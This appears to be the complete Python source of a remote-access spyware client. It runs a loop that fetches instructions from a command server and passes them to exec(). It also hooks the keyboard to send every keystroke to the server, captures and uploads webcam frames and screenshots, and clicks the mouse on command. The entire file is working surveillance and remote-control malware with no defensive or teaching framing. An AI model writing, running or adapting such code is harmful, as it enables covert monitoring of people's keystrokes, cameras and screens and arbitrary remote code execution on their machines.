import requests
import time
import io
import pyautogui
import PIL
import cv2
import keyboard
from PIL import ImageDraw

endPoint = "http://localhost:8080"

def GetCameraBytes():
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    cap.release()

    if not ret:
        print("Failed to capture webcam frame")
        return None
    frame_rgb = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
    imgBytes = io.BytesIO()
    img = PIL.Image.fromarray(frame_rgb)
    img.save(imgBytes, format="PNG")
    imgBytes.seek(0)
    return imgBytes

def SendKeyPress(key):
    requests.post(endPoint + "/keypress", key)

def KeyPressed(eventArgs):
    keyName = eventArgs.name
    eventType = eventArgs.event_type
    if eventType == "up":
        SendKeyPress(keyName)

def StartKeylogger():
    keyboard.hook(KeyPressed)

def StopKeylogger():
    keyboard.unhook_all()

def GetCamera():
    imgBytes = GetCameraBytes()
    if imgBytes:
        fileData = {"file": ("cameraframe.png", imgBytes, "image/png")}
        requests.post(endPoint + "/upload", files=fileData)

def GetScreenBytes():
    screenShot = pyautogui.screenshot()
    imgBytes = io.BytesIO()
    screenShot.save(imgBytes, "PNG")
    imgBytes.seek(0)
    return imgBytes

def GetScreen(name = "screenshot"):
    imgBytes = GetScreenBytes()
    fileData = {"file": (f"{name}.png", imgBytes, "image/png")}
    requests.post(endPoint + "/upload", files=fileData)

def GetInstructions():
    instructions = None
    try:
        response = requests.get(endPoint)
        instructions = response.json()
    except Exception as e:
        print(f"Error while fetching: {e}")
    if not instructions:
        return []
    return instructions

def GetScreenDotBytes(y, x, radius):
    screenShot = pyautogui.screenshot()
    draw = ImageDraw.Draw(screenShot)
    draw.ellipse((x - radius, y - radius, x + radius, y + radius), fill='red')
    imgBytes = io.BytesIO()
    screenShot.save(imgBytes, "PNG")
    imgBytes.seek(0)
    return imgBytes

def GetPosOnScreen(y, x, radius):
    imgBytes = GetScreenDotBytes(y, x, radius)
    fileData = {"file": (f"posy{y}x{x}.png", imgBytes, "image/png")}
    requests.post(endPoint + "/upload", files=fileData)

def ClickAt(y_pos, x_pos):
    pyautogui.click(y=y_pos, x=x_pos)

def ExecuteInstructions(instructions):
    for instruction in instructions:
        print("executing instruction: " + instruction)
        try:
            exec(instruction)
        except Exception as e:
            print(f"Error executing instruction: {e}")

def main():
    instructions = GetInstructions()
    ExecuteInstructions(instructions)

while True:
    main()
    time.sleep(0.5)
